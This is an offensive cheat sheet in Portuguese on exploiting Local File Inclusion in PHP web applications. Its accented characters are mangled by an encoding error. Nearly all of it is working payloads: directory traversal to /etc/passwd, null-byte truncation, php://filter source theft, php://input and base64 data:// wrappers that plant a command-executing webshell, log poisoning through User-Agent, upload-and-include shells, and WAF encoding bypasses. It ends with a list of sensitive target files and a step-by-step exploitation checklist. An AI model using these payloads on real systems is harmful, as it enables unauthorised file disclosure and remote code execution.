
---

## üìå **LFI ‚Äì Local File Inclusion**

### ‚úÖ O que √© LFI?
LFI √© uma vulnerabilidade que permite a um atacante incluir arquivos locais do servidor no navegador, atrav√©s da manipula√ß√£o de par√¢metros em aplica√ß√µes web vulner√°veis.

Exemplo t√≠pico:
```
http://site.com/index.php?page=about
```

Se o par√¢metro `page` for vulner√°vel e n√£o houver valida√ß√£o adequada, √© poss√≠vel tentar incluir arquivos arbitr√°rios do sistema, como:
```
http://site.com/index.php?page=../../../../etc/passwd
```

---

## üîç Objetivos do LFI

- Ler arquivos sens√≠veis (`/etc/passwd`, logs, arquivos `.env`, etc).
- Conseguir **RCE** (execu√ß√£o remota de comandos) em casos com wrappers como `php://input` ou upload de shell.
- Enumerar diret√≥rios e arquivos do sistema.
- Explorar mal uso de fun√ß√µes como `include`, `require`, `fopen`, `file_get_contents`, etc.

---

## üß¨ Formas de Bypass em LFI

### 1. **Bypass com Diret√≥rios**
Usar m√∫ltiplos `../` para subir na √°rvore de diret√≥rios:
```php
?page=../../../../../../etc/passwd
```

#### Dica:
- Pode ser necess√°rio repetir `../` muitas vezes at√© alcan√ßar a raiz.
- Pode usar scripts para automatizar isso (ex: `wfuzz`, `ffuf`, `burp intruder`).

---

### 2. **Truncamento de Sufixo (Null Byte Injection)**

Alguns servidores antigos (ou vers√µes antigas do PHP) permitem o uso de `%00` (null byte) para truncar strings e ignorar extens√µes adicionadas pelo c√≥digo.

Exemplo:
```php
?page=../../../../etc/passwd%00
```

> ‚ö†Ô∏è Esse bypass depende da configura√ß√£o do servidor e da vers√£o do PHP. Desde o PHP 5.3 ele foi mitigado.

---

### 3. **Bypass com Wrappers do PHP**

#### a) `php://filter`

Permite ler arquivos como base64 sem execut√°-los:
```
?page=php://filter/read=convert.base64-encode/resource=index.php
```
üîç **Utilidade**: exfiltrar c√≥digo-fonte PHP protegido.

#### b) `php://input`  
Usado para tentar RCE quando a entrada √© inclu√≠da com `include("php://input")`.

```
POST /index.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```
E acessar via:
```
/index.php?page=php://input&cmd=id
```

> ‚ö†Ô∏è Necessita que a entrada seja usada dentro de uma fun√ß√£o de inclus√£o.

#### c) `data://`
Cria um stream em base64, semelhante ao `php://input`.

```
?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
Este base64 decodifica para: `<?php system($_GET['cmd']); ?>`

---

### 4. **Bypass com Codifica√ß√£o**

#### a) URL Encoding
```
?page=..%2f..%2f..%2fetc%2fpasswd
```

#### b) Double Encoding
```
?page=..%252f..%252fetc%252fpasswd
```

#### c) Mixed Encoding
Alguns WAFs permitem partes codificadas:
```
?page=..%2f..%252fetc/passwd
```

---

### 5. **Bypass com Inclus√£o de Logs**

Explorar arquivos de log com c√≥digo PHP injetado por User-Agent, Referer, etc.

1. Enviar request com:
```
User-Agent: <?php system($_GET['cmd']); ?>
```

2. Incluir o arquivo de log:
```
?page=/var/log/apache2/access.log&cmd=id
```

> **Paths comuns de logs**:
- `/var/log/apache2/access.log`
- `/var/log/httpd/access_log`
- `/var/log/nginx/access.log`

---

### 6. **Bypass via Uploads**

1. Fazer upload de um arquivo com extens√£o `.jpg` ou `.txt` contendo PHP.

```php
<?php system($_GET['cmd']); ?>
```

2. Descobrir o caminho do arquivo (por brute-force ou diret√≥rio previs√≠vel).

3. Incluir:
```
?page=/uploads/shell.jpg&cmd=id
```

---

### 7. **Wrapper Input com Post Injection (LFI to RCE)**

PHP permite wrappers como `php://input`, e o c√≥digo ser√° interpretado se usado dentro de `include()`.

Exemplo:
```php
include($_GET['page']);
```

POST:
```http
POST /index.php?page=php://input
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

Acesso:
```
/index.php?page=php://input&cmd=whoami
```

---

### üß™ Ferramentas √∫teis

- **Burp Suite** ‚Äì Automa√ß√£o de fuzzing em par√¢metros.
- **wfuzz / ffuf** ‚Äì Fuzzing de diret√≥rios e caminhos.
- **Liffy** ‚Äì Ferramenta em Python para explora√ß√£o de LFI.
- **LFI Suite** ‚Äì Ferramenta para automatizar leitura de arquivos com LFI.

---

### üß∑ Dicas de Arquivos Interessantes para LFI

| Sistema | Caminho |
|--------|--------|
| Linux | `/etc/passwd`, `/etc/hostname`, `/etc/shadow` (se tiver permiss√£o) |
| Apache | `/var/log/apache2/access.log` |
| Nginx | `/var/log/nginx/access.log` |
| PHP | `/var/log/php_errors.log`, `php://filter/...` |
| Webapps | `.env`, `config.php`, `wp-config.php` |

---

## ‚úÖ **Checklist para Explora√ß√£o de LFI**

1. Testar inclus√£o b√°sica com `../../../etc/passwd`
2. Testar wrappers `php://filter`, `php://input`, `data://`
3. Tentar truncamento `%00` se PHP antigo
4. Injetar payloads em logs (User-Agent)
5. Verificar possibilidade de upload + inclus√£o
6. Tentar codifica√ß√µes (%2e%2e%2f, double encoding)
7. Automatizar brute-force de caminhos sens√≠veis

---
